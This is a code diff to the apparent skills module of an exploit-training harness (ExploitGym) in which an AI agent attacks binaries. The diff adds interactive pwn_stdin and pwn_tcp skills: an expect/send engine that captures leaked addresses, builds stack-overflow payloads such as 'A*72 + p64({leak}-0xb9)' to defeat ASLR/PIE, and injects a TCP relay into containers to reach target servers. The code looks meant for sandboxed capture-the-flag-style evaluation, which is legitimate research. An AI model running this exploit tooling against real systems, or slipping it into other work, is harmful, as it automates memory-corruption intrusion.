@@ -5,6 +5,7 @@ The model supplies intent (which procedure, which binary); these host-side
 implementations supply the craft. Logic ported from homework/solve_rung1.py —
 that file stays untouched as the solvability-proof artifact.
 """
+import asyncio
 import re
 import struct
 
@@ -64,14 +65,16 @@ def parse_payload(spec: str) -> bytes:
 
 
 # ---- docker-backed skills -----------------------------------------------------
-# Each coroutine: (cexec, args: str) -> str. cexec runs argv inside the bound
-# container and returns (exit_code, combined_output). Skills NEVER raise —
-# failures come back as diagnostic text the agent can act on.
+# Each coroutine: (cexec, args: str, spawn=None) -> str. cexec runs argv inside
+# the bound container and returns (exit_code, combined_output); spawn (when the
+# harness provides one) starts an interactive async subprocess for the pwn_*
+# skills. Skills NEVER raise — failures come back as diagnostic text the agent
+# can act on.
 
 _FALLBACK_OFFSET = 72  # 64-byte buf + saved rbp at -O0, verified on homework rungs
 
 
-async def _skill_discover_offset(cexec, args: str) -> str:
+async def _skill_discover_offset(cexec, args: str, spawn=None) -> str:
     binary = args.split()[0] if args.split() else ""
     if not binary:
         return "usage: skill discover_offset <binary-path>"
@@ -102,7 +105,7 @@ async def _skill_discover_offset(cexec, args: str) -> str:
             f"\nfallback for -O0 layout (64-byte buf + saved rbp): {_FALLBACK_OFFSET}")
 
 
-async def _skill_find_symbol(cexec, args: str) -> str:
+async def _skill_find_symbol(cexec, args: str, spawn=None) -> str:
     parts = args.split()
     if len(parts) < 2:
         return "usage: skill find_symbol <binary> <symbol>"
@@ -121,7 +124,7 @@ async def _skill_find_symbol(cexec, args: str) -> str:
     return f"{name} = 0x{addr:x} (absolute address — non-PIE binary)"
 
 
-async def _skill_cyclic(cexec, args: str) -> str:
+async def _skill_cyclic(cexec, args: str, spawn=None) -> str:
     try:
         n = int(args.split()[0])
     except (IndexError, ValueError):
@@ -129,7 +132,7 @@ async def _skill_cyclic(cexec, args: str) -> str:
     return cyclic(min(n, 4096)).decode("latin-1")
 
 
-async def _skill_cyclic_find(cexec, args: str) -> str:
+async def _skill_cyclic_find(cexec, args: str, spawn=None) -> str:
     tok = args.split()[0] if args.split() else ""
     tok = tok[2:] if tok.startswith("0x") else tok
     try:
@@ -142,7 +145,7 @@ async def _skill_cyclic_find(cexec, args: str) -> str:
     return f"offset of 0x{tok} in the cyclic pattern: {off}"
 
 
-async def _skill_deliver_stdin(cexec, args: str) -> str:
+async def _skill_deliver_stdin(cexec, args: str, spawn=None) -> str:
     binary, _, spec = args.strip().partition(" ")
     if not binary or not spec.strip():
         return ("usage: skill deliver_stdin <binary> <spec>  "
@@ -153,36 +156,6 @@ async def _skill_deliver_stdin(cexec, args: str) -> str:
         return f"bad payload spec: {e}"
     code, out = await cexec(binary, input_bytes=payload, timeout=30)
     return f"[sent {len(payload)} bytes on stdin, exit {code}]\n{out.rstrip()}"
-
-
-SKILLS = {
-    "discover_offset": ("discover_offset <binary> — crash under gdb on a cyclic "
-                        "pattern; returns the exact offset to the saved return address",
-                        _skill_discover_offset),
-    "find_symbol": ("find_symbol <binary> <name> — nm + PIE check; returns the "
-                    "function's absolute address (non-PIE) or file offset (PIE)",
-                    _skill_find_symbol),
-    "cyclic": ("cyclic <n> — print a De Bruijn pattern of length n (payload padding "
-               "whose every 4-byte fragment locates its own offset)",
-               _skill_cyclic),
-    "cyclic_find": ("cyclic_find <hexbytes> — offset of a byte fragment (e.g. a "
-                    "register value) in the standard cyclic pattern",
-                    _skill_cyclic_find),
-    "deliver_stdin": ("deliver_stdin <binary> <spec> — run the target with a payload "
-                      "on stdin; spec e.g. 'A*72 + p64(0x4011d6)'; returns its output",
-                      _skill_deliver_stdin),
-}
-
-
-def skill_docs() -> str:
-    return "\n".join(f"          {doc}" for doc, _ in SKILLS.values())
-
-
-async def run_skill(name: str, args: str, cexec) -> str:
-    entry = SKILLS.get(name)
-    if entry is None:
-        return ("unknown skill '%s'; available:\n" % name) + skill_docs()
-    return await entry[1](cexec, args)
 
 
 # ---- interactive step engine (pwn_stdin / pwn_tcp) ----------------------------
@@ -308,3 +281,207 @@ def parse_steps(arg_tail: str):
             except re.error as e:
                 return None, False, f"bad expect regex {val!r}: {e}"
     return steps, hex8, None
+
+
+# ---- session engine (run_steps) -------------------------------------------------
+
+_EXPECT_TIMEOUT = 15
+_READ_CAP = 65536
+
+_RELAY_PATH = "/tmp/tcp_relay.py"
+# TCP relay, injected into the agent container: bridges its stdin/stdout to a
+# socket. ExploitGym servers live on an internal docker network the HOST can't
+# reach, so the dial must happen container-side. python 3.5-safe (no f-strings,
+# no os.set_blocking) — ExploitGym images ship xenial-era python.
+_RELAY_SRC = """\
+import socket, sys, os, select
+
+s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
+watch = [0, s]
+while watch:
+    r, _, _ = select.select(watch, [], [], 60)
+    if not r:
+        break
+    for fd in r:
+        if fd == 0:
+            data = os.read(0, 65536)
+            if data:
+                s.sendall(data)
+            else:
+                s.shutdown(socket.SHUT_WR)
+                watch.remove(0)
+        else:
+            data = s.recv(65536)
+            if not data:
+                os._exit(0)
+            os.write(1, data)
+"""
+
+
+async def _read_until(proc, pattern: str, deadline: float, buf: str) -> tuple:
+    """Read until the regex matches, the deadline passes, EOF, or the read cap.
+    `buf` is UNCONSUMED text carried over from the previous expect — a banner
+    holding two leaks must not lose its tail. Returns (consumed, rest, match)
+    where consumed+rest is everything read so far; match is None on failure.
+    latin-1 decode: 1:1 byte map."""
+    rx = re.compile(pattern)
+    loop = asyncio.get_running_loop()
+    while True:
+        m = rx.search(buf)
+        if m:
+            return buf[:m.end()], buf[m.end():], m
+        if len(buf) >= _READ_CAP:
+            return "", buf, None
+        remaining = deadline - loop.time()
+        if remaining <= 0:
+            return "", buf, None
+        try:
+            chunk = await asyncio.wait_for(proc.stdout.read(4096), remaining)
+        except asyncio.TimeoutError:
+            return "", buf, None
+        if not chunk:
+            return "", buf, None
+        buf += chunk.decode("latin-1")
+
+
+def _to_int(text: str) -> int:
+    try:
+        return int(text, 0)
+    except ValueError:
+        return int(text, 16)
+
+
+async def run_steps(spawn, argv: tuple, steps: list, hex8: bool = False) -> str:
+    """Drive one interactive session through expect/send steps. NEVER raises —
+    every failure comes back as diagnostic text with what was actually read."""
+    try:
+        proc = await spawn(*argv)
+    except Exception as e:
+        return f"spawn failed for {argv}: {e}"
+    leaks: dict = {}
+    captured = 0
+    transcript: list = []
+    buf = ""  # unconsumed text carried between expects
+    last_send = max(i for i, (op, _) in enumerate(steps) if op == "send")
+    try:
+        for i, (op, val) in enumerate(steps):
+            if op == "expect":
+                deadline = asyncio.get_running_loop().time() + _EXPECT_TIMEOUT
+                seen, buf, m = await _read_until(proc, val, deadline, buf)
+                transcript.append(seen)
+                if m is None:
+                    return ("expect FAILED: pattern %r not seen (timeout %ds, "
+                            "EOF, or %d-byte cap).\nwhat was actually read:\n%s"
+                            % (val, _EXPECT_TIMEOUT, _READ_CAP,
+                               (seen + buf)[-1200:]))
+                if m.groups():
+                    captured += 1
+                    v = _to_int(m.group(1))
+                    leaks["leak%d" % captured] = v
+                    leaks["leak"] = v
+            else:  # send
+                try:
+                    payload = render_template(val, leaks)
+                except ValueError as e:
+                    return "bad send template: %s" % e
+                if hex8 and i == last_send:
+                    payload = ("%08x" % len(payload)).encode() + payload
+                proc.stdin.write(payload)
+                await proc.stdin.drain()
+                transcript.append(">> sent %d bytes" % len(payload))
+        try:
+            proc.stdin.close()
+        except Exception:
+            pass
+        deadline = asyncio.get_running_loop().time() + _EXPECT_TIMEOUT
+        rest, buf, _ = await _read_until(proc, r"(?!)", deadline, buf)  # to EOF
+        transcript.append(rest + buf)
+        return "\n".join(t for t in transcript if t)
+    finally:
+        try:
+            proc.kill()
+        except Exception:
+            pass
+
+
+async def _skill_pwn_stdin(cexec, args: str, spawn=None) -> str:
+    binary, _, tail = args.strip().partition(" ")
+    if not binary or not tail.strip():
+        return ("usage: skill pwn_stdin <binary> <steps>  e.g. "
+                r"skill pwn_stdin /target/rung2 main:\s*(0x[0-9a-f]+) "
+                "A*72 + p64({leak}-0xb9)")
+    steps, hex8, err = parse_steps(tail)
+    if err:
+        return err
+    if hex8:
+        return "hex8 (size prefix) is only meaningful for pwn_tcp"
+    if spawn is None:
+        return "pwn_stdin needs an interactive-capable harness (no spawn)"
+    return await run_steps(spawn, (binary,), steps)
+
+
+async def _skill_pwn_tcp(cexec, args: str, spawn=None) -> str:
+    if spawn is None:
+        return "pwn_tcp needs an interactive-capable harness (no spawn)"
+    parts = args.split(None, 2)
+    if len(parts) < 3:
+        return ("usage: skill pwn_tcp <host> <port> <steps> [hex8]  e.g. "
+                r"skill pwn_tcp 172.18.0.5 8000 main:\s*(0x[0-9a-f]+) "
+                "A*72 + p64({leak}-0xb9) hex8")
+    host, port, tail = parts
+    steps, hex8, err = parse_steps(tail)
+    if err:
+        return err
+    code, _ = await cexec("test", "-f", _RELAY_PATH)
+    if code != 0:
+        code, out = await cexec("bash", "-c", "cat > " + _RELAY_PATH,
+                                input_bytes=_RELAY_SRC.encode())
+        if code != 0:
+            return "failed to inject the tcp relay into the container:\n" + out
+    return await run_steps(spawn, ("python3", _RELAY_PATH, host, port),
+                           steps, hex8=hex8)
+
+
+# ---- registry + dispatcher (after ALL coroutines are defined) -------------------
+
+SKILLS = {
+    "discover_offset": ("discover_offset <binary> — crash under gdb on a cyclic "
+                        "pattern; returns the exact offset to the saved return address",
+                        _skill_discover_offset),
+    "find_symbol": ("find_symbol <binary> <name> — nm + PIE check; returns the "
+                    "function's absolute address (non-PIE) or file offset (PIE)",
+                    _skill_find_symbol),
+    "cyclic": ("cyclic <n> — print a De Bruijn pattern of length n (payload padding "
+               "whose every 4-byte fragment locates its own offset)",
+               _skill_cyclic),
+    "cyclic_find": ("cyclic_find <hexbytes> — offset of a byte fragment (e.g. a "
+                    "register value) in the standard cyclic pattern",
+                    _skill_cyclic_find),
+    "deliver_stdin": ("deliver_stdin <binary> <spec> — run the target with a payload "
+                      "on stdin; spec e.g. 'A*72 + p64(0x4011d6)'; returns its output",
+                      _skill_deliver_stdin),
+    "pwn_stdin": ("pwn_stdin <binary> <steps> — INTERACTIVE: leak and deliver in "
+                  "ONE process (required under ASLR/PIE). Steps: expect:<regex> "
+                  "send:<template>, or shorthand '<regex> <template>'. {leak}, "
+                  "{leak1..N}, {leak±0xN} substitute captured addresses. e.g. "
+                  "skill pwn_stdin /target/rung2 main:\\s*(0x[0-9a-f]+) "
+                  "A*72 + p64({leak}-0xb9)",
+                  _skill_pwn_stdin),
+    "pwn_tcp": ("pwn_tcp <host> <port> <steps> [hex8] — same engine over a TCP "
+                "socket (dialed from inside the container). hex8 adds "
+                "ExploitGym's 8-byte-hex size prefix to the final payload. e.g. "
+                "skill pwn_tcp 172.18.0.5 8000 main:\\s*(0x[0-9a-f]+) "
+                "A*72 + p64({leak}-0xb9) hex8",
+                _skill_pwn_tcp),
+}
+
+
+def skill_docs() -> str:
+    return "\n".join(f"          {doc}" for doc, _ in SKILLS.values())
+
+
+async def run_skill(name: str, args: str, cexec, spawn=None) -> str:
+    entry = SKILLS.get(name)
+    if entry is None:
+        return ("unknown skill '%s'; available:\n" % name) + skill_docs()
+    return await entry[1](cexec, args, spawn)
